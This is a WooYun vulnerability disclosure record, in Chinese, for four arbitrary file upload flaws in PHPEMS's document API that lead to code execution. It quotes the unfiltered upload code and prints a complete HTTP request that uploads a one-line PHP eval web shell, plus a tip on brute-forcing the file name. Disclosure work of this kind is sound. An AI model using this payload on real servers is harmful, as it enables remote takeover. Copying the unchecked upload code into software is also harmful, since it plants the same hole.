{"id": 36854, "wybug_id": "wooyun-2015-0100982", "wybug_title": "phpems前台某4处getshell漏洞", "wybug_corp": "PHPEMS", "wybug_author": "路人甲", "wybug_date": "2015-03-12 18:15", "wybug_open_date": "2015-04-30 18:48", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-12：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： phpems前台某4处getshell漏洞 详细说明：  2.phpems前台某4处getshell漏洞存在漏洞的代码在/app/document/api.php的upload(),uploadfile(),swupload(),swfuploadvideo()这四个函数上，因为这四个函数都是处理上传文件的，而且处理方式都一模一样，所以均存在任意文件上传漏洞首先这四个函数通过注册用户登录，调整URL参数均可以访问到接下来我以public function swfuploadvideo()\t{\t\t$path = 'files/attach/images/content/'.date('Ymd').'/';\t\t$fileurl = $this->files-> ($this->ev->getFile('Filedata'),$path);\t\techo $fileurl;\t}为例，介绍一下$this->ev->getFile('Filedata')非常简单\tpublic function getFile($par)    {    \tif(isset($this->file[$par]))return $this->file[$par];    \telse return false;}就是简单的获取一个$_FILE环境变量uploadFile()是漏洞发生的关键点public function uploadFile($file,$updir,$sExtension = NULL,$name = NULL)\t{\t\tif(!$sExtension)$sExtension = $this->getFileExtName($file['name']);\t\tif(!$name)$name = time().rand(1000,9999);\t\tif(!file_exists($updir))$this->mdir($updir);\t\t$url = $updir.$name.'.'.$sExtension;\t\tif(file_exists($url))unlink($url);\t\tmove_uploaded_file( $file['tmp_name'], $url ) ;\t\tif (file_exists($url))\t\t{\t\t\t$oldumask = umask(0) ;\t\t\tchmod( $url, 0777 ) ;\t\t\tumask( $oldumask ) ;\t\t}\t\treturn $url;\t}获得后缀名函数public function getFileExtName($filename)\t{\t\t$filename = strtolower($filename);\t\t$exts = explode('.',$filename);\t\t$ext = $exts[count($exts)-1];\t\tif(strpos($ext,'?') >= 0)\t\t{\t\t\t$ext = explode('?',$ext);\t\t\treturn $ext[0];\t\t}\t\telse\t\treturn $ext;\t}OK!简而言之就是根本没有进行任何文件后缀名的过滤就直接上传了验证：首先注册个用户test 123456登录之访问http://192.168.1.103/ems/index.php?document-api-upload并用burpsuite截取数据包，\n\n然后修改数据包(cookie不能动)\n\n文件已经上传成功没有问题\n\n完整的数据包如下：POST /ems/index.php?document-api-upload HTTP/1.1Content-Length: 196Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8User-Agent: Mozilla/5.0Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7Host: 192.168.1.103Cookie: exam_psid=d56020c12a73fc4b5ff0ec9ca2da5219; exam_currentuser=%25D9%25A8q%259E%25F4%25DF%25AD%259DckT%25A3%2595%25A5%25EB%25D7%25A8%25D2%25EE%25DF%25D8%25DE%2599%2595Tk%25A3l%25A9%25A8%255B%2596%259B%25A7%25E6%25A6aflR%25A3%2597%25EB%25E1%25A2%25D3%25E7%25DC%25D4%25DF%25A3%25A8%25A1%25A2%2594T%25B3%25E1s%2597%25AB%25A6%2595%25D1aa%2593%2594%2593e%25B1%25A2r%25C6%25DA%25A1%25AC%25CD%2592%2593%2597ef%2597%25A8%25A3p%25CA%25AB%259C%25D9%25A4hd%2597Rk%25A5%25B2%25A7s%2586%25EC%25D1%25E6%25DF%2599%25A0%25A0%2599%25A0T%25B3%25E1s%2595%25AC%25A6%2595%259Dic%2560afj%25A6%259Fg%2595%25A9%259F%2595%25A7%25A3kcdjT%25EB%25D3%25AC%25D7%25E2%25DB%25E1%25D3%25A2%25A0%25A7%25A0%2599%2596%259A%25A9%25AC%259E%25AA%25A6%2595%25A4Rl%25A5jah%25B2%2590%25AC%25C9%25EC%25DF%25DC%25DB%259E%259D%25A1%2597%2599%25A0%25EC%25D7%25A6%25C9%259B%25A7%25DC%25A6aedf%2560j%25A8%25A2n%259C%25B4%25DF%25AD%259DekT%25A3%2595%25A5%25EB%25D7%25A8%25D2%25EE%25DF%25D8%25DE%259E%2592%259F%2595Rm%25EB%25A8m%259E%259B%25E0%25D8%25DF%25A4Sm%25A3jc%25AE%25A8%255B%25D7%25DE%25DF%25E6%25D5%259F%259F%25A6%2599%259D%2597%25E4%25D7%25A6%25CD%25ED%258E%25AE%25D5jbfbfb%25B0%259Em%2599%25B1%25A7%25E6%25A6ikT%25A3%2595%25A5%25EB%25D7%25A8%25D2%25E2%25D0%2595%25A7%25A3kebjT%25DC%25A3o%2594%25AB%259C%25D6%259Db%2592ic%2596%2595%25AC%25D0n%25CA%25DF%259C%25D8%25CFi%2594%2593b%2594%2593%25AD%25A0j%259D%259B%25A7%25F0Content-Type: multipart/form-data; boundary=----------0x14c080d5172L------------0x14c080d5172LContent-Disposition: form-data; name=\"upload\"; filename=\"shell.php\"Content-Type: application/octet-stream<?php eval($_POST['TNT'])?>------------0x14c080d5172L文件名的话time().random()爆破量很少就能找到木马，再说利用如果是windows平台，更容易了，大家都懂的其他三处原理一模一样，不过多讲了，OK!   漏洞证明：  \n\n\n\n\n\n   修复方案：  增加上传文件类型验证   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}